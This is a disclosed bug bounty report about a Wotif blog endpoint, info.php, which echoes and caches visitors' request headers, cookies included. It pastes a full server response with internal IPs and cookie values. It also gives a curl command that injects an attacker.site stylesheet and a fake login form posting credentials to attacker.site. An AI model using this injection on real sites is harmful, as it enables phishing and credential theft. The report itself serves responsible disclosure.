# https://www.wotif.com/vc/blog/info.php script is prone to reflected HTML/CSS injection and COOKIE leak

## Report Details
- **Report ID**: 1888351
- **URL**: https://hackerone.com/reports/1888351
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-02-27T14:09:45.666Z
- **Disclosed**: 2023-05-20T15:44:31.812Z

## Reporter
- **Username**: maskopatol
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: expediagroup_bbp

## Vulnerability Information
## Summary:
Hi,
I've found that https://www.wotif.com/vs/blog/info.php script is prone to reflected HTML/CSS injection and COOKIE leak. I don't know what is the purpose of that script, however looks like it caches for ~1h a last request over HTTP GET with all HTTP headers send by user + some headers send by Akamai. I'm not sure if there is any sensitive Akamai headers there (some headers reported by that scripts reveal a IP addresses from private network), but I'm sure that malicious actor may inject in that way some HTML/CSS code. As style and form are accepted so attacker probably could use that vulnerability for e.g. phising attack.
Fortunately - despite of many attempts I was unable to exploit this vulnerability as XSS - Akamai WAF protects that endpoint from XSS (at least as long as new bypass method is not found :))

Second problem with that script is related to HTTP_COOKIES header. As I mentioned before, this script caches all HTTP headers of visitor for ~1h, so if attacker convince the victim to visit that page, then victim cookies will be cached by script and visible to anybody who visit this script after victim.

Current response:
```
TEMP => /tmp
TMPDIR => /tmp
TMP => /tmp
PATH => /usr/local/bin:/usr/bin:/bin
HOSTNAME =>
USER => nginx
HOME => /var/lib/nginx
HTTP_X_DATADOG_SAMPLING_PRIORITY => 0
HTTP_X_DATADOG_PARENT_ID => 2356387789306272938
HTTP_X_DATADOG_TRACE_ID => 2570661382097469643
HTTP_CGP_AGENT_IDS_DUAID => 0c8072a3-7d9b-4be1-bbcf-d2acaaf8c627
HTTP_CTX_USER_TUID => -1
HTTP_CTX_USER_STATE => single-use
HTTP_CTX_SITE_CURRENCY => AUD
HTTP_CTX_SITE_EAPID => 0
HTTP_CTX_SITE_TPID => 70125
HTTP_CTX_SITE_LOCALE => en_AU
HTTP_CTX_SITE_ID => 70125
HTTP_CTX_PARTNER_ACCOUNT_ID => d34ca89e-4f80-4815-8057-b91672192b53
HTTP_CTX_PRIVACY =>
HTTP_CTX_AGENT_DEVICE_ID => 0c8072a3-7d9b-4be1-bbcf-d2acaaf8c627
HTTP_EDGE_AGENT_TRAITS_CLASSIFICATION => UnknownBot
HTTP_EDGE_AGENT_TRAITS_ALIGNMENT_SCORE => 0.0
HTTP_EDGE_AGENT_TRAITS_BOTNESS_SCORE => 1.0
HTTP_EDGE_AGENT_GEOLOCATION_INFO => {"latitude":50.27,"longitude":19.02,"countryCode":"PL","regionCode":"","city":"KATOWICE","continent":"EU","postalCode":"","timezone":"+01:00","metroCode":-1}
HTTP_EDGE_AGENT_DEVICE_INFO => {"brandName":"cURL","modelName":"cURL","isTablet":false,"isMobile":false,"resolutionHeight":600,"resolutionWidth":800,"physicalScreenHeight":400,"physicalScreenWidth":400,"type":"DESKTOP"}
HTTP_EDGE_AGENT_IP => 89.74.158.194
HTTP_X_EXPEDIA_TPID => 70125
HTTP_CGP_AGENT_GEOLOCATION_INFO => {"latitude":50.27,"longitude":19.02,"countryCode":"PL","regionCode":"","city":"KATOWICE","continent":"EU","postalCode":"","timezone":"+01:00","metroCode":-1}
HTTP_CGP_AGENT_TRAITS_BOTNESS_SCORE => 1.0
HTTP_CGP_AGENT_TRAITS_CLASSIFICATION => UnknownBot
HTTP_X_CGP_ENV => ewecgp-prod
HTTP_X_CGP_REGION => eu-west-1
HTTP_CGP_AGENT_DEVICE_ID => 0c8072a3-7d9b-4be1-bbcf-d2acaaf8c627
HTTP_CGP_AGENT_TRAITS_ALIGNMENT_SCORE => 0.0
HTTP_X_EXPEDIA_EAPID => 0
HTTP_X_EXPEDIA_SITE_ID => 70125
HTTP_CGP_ROUTE_APPLICATION => seo-vendor-content-wotif-blog
HTTP_X_CLOUD_GATE_DESTINATION_ID => seo-vendor-content-wotif-blog
HTTP_CGP_ROUTE_ENDPOINT => seo-vendor-content-blog
HTTP_X_BONO_CONFIDENCE => 100
HTTP_X_BONO_RULES_EXECUTED => -
HTTP_X_BONO_CLASSIFICATION => UnknownBot
HTTP_COOKIE => MC1=GUID=0c8072a37d9b4be1bbcfd2acaaf8c627; DUAID=0c8072a3-7d9b-4be1-bbcf-d2acaaf8c627; HMS=c7e5fe2f-8c58-4e65-b97a-5c9f8f7371a9
HTTP_DEVICE_USER_AGENT_ID => 0c8072a3-7d9b-4be1-bbcf-d2acaaf8c627
HTTP_X_B3_SAMPLED => 1
HTTP_X_B3_SPANID => bb92594475e89bbe
HTTP_X_B3_TRACEID => 1557eb34142c42509d22dfee3abe67b7
HTTP_MESSAGE_ID => 00000000-0000-0000-bb92-594475e89bbe
HTTP_TRACE_ID => 1557eb34-142c-4250-9d22-dfee3abe67b7
HTTP_X_CGP_INSTANCE => i-0f45203154581aa55
HTTP_X_FORWARDED_PROTO => https
HTTP_X_CGP_REQUEST_ID => 0838fecf-b682-11ed-a11c-0242edcb948b
HTTP_VIA => 1.1 v1-akamaitech.net(ghost) (AkamaiGHost), 1.1 akamai.net(ghost) (AkamaiGHost), 1.1 styx
HTTP_X_FORWARDED_HOST => www.wotif.com
HTTP_X_FORWARDED_PORT => 443
HTTP_X_AKAMAI_SR_HOP => 1
HTTP_X_AKAMAI_EDGESCAPE => georegion=175,country_code=PL,city=KATOWICE,lat=50.27,long=19.02,timezone=GMT+1,continent=EU,throughput=vhigh,bw=5000,network=upc,asnum=6830,location_id=0
HTTP_X_AKAMAI_DEVICE_CHARACTERISTICS => brand_name=cURL;device_os_version=;device_os=;is_mobile=false;is_tablet=false;is_wireless_device=false;mobile_browser=;mobile_browser_version=;model_name=cURL;physical_screen_height=400;physical_screen_width=400;resolution_width=800;resolution_height=600
HTTP_X_AKAMAI_CONFIG_LOG_DETAIL => true
HTTP_USER_AGENT => curl/7.74.0
HTTP_PRAGMA => no-cache
HTTP_HACKERONE => maskopatoltest
HTTP_CUSTOM => MaskoPatol
test

HTTP_CLIENT_IP => 89.74.158.194
HTTP_CACHE_CONTROL => no-cache, max-age=0
HTTP_AKAMAI_REPUTATION => ID=89.74.158.194;WEBATCK=2;WEBSCRP=8;SCANTL=4
HTTP_AKAMAI_ORIGIN_HOP => 2
HTTP_AKAMAI_BOT => Unknown Bot (curl_B63A5D77CF6DEE8E69E18C12900A172D):monitor:HTTP Libraries
HTTP_ACCEPT_ENCODING => gzip
HTTP_ACCEPT => text/html
HTTP_CONNECTION => close
HTTP_X_REAL_IP => 89.74.158.194
HTTP_X_FORWARDED_FOR => 89.74.158.194, 104.81.60.150, 2.20.70.4, 10.5.143.216, 89.74.158.194
HTTP_HOST => wotif-au.waveinteractive.com
REDIRECT_STATUS => 200
SERVER_NAME => 10.77.5.2
SERVER_PORT => 80
SERVER_ADDR => 10.77.5.2
REMOTE_PORT => 46004
REMOTE_ADDR => 10.77.5.4
SERVER_SOFTWARE => nginx/1.20.1
GATEWAY_INTERFACE => CGI/1.1
REQUEST_SCHEME => http
SERVER_PROTOCOL => HTTP/1.0
DOCUMENT_ROOT => /var/www/wotif
DOCUMENT_URI => /vc/blog/info.php
REQUEST_URI => /vc/blog/info.php
SCRIPT_NAME => /vc/blog/info.php
CONTENT_LENGTH =>
CONTENT_TYPE =>
REQUEST_METHOD => GET
QUERY_STRING =>
SCRIPT_FILENAME => /var/www/wotif/vc/blog/info.php
FCGI_ROLE => RESPONDER
PHP_SELF => /vc/blog/info.php
REQUEST_TIME_FLOAT => 1677490512.8018
REQUEST_TIME => 1677490512
```

## Steps To Reproduce:
A: To inject the external stylesheet and custom HTML form:
  1. As attacker send following request to add external stylesheet and custom form with two fields and button:
```curl -H "X-hackerone: maskopatol" -H 'A: <link href="https://attacker.site/styles.css" rel="stylesheet">' -H 'B: <div id="background"></div><form action="https://attacker.site/wotif.php"><input name="login"><input name="password"><input type="submit"></form>' 'https://www.wotif.com/vc/blog/info.php'```
 2. Due to some kind of caching, to keep it persist and reliable attacker have to send it circullary, for e.g. 2 minutes

B: To grab the victim cookies it is enough to convinced the victim to visit https://www.wotif.com/vs/blog/info.php page and make sure that nobody use it in last ~1h.

## Recommended Remediation Steps 
  1. Disable unnecessary scripts/endpoints.

## Impact

Normally reflected CSS injection may results in various side channel attacks, like revealing CSRF tokens or part of URLs, but not in that case, as info.php endpoints doesn't have such information

## Attachments
No attachments
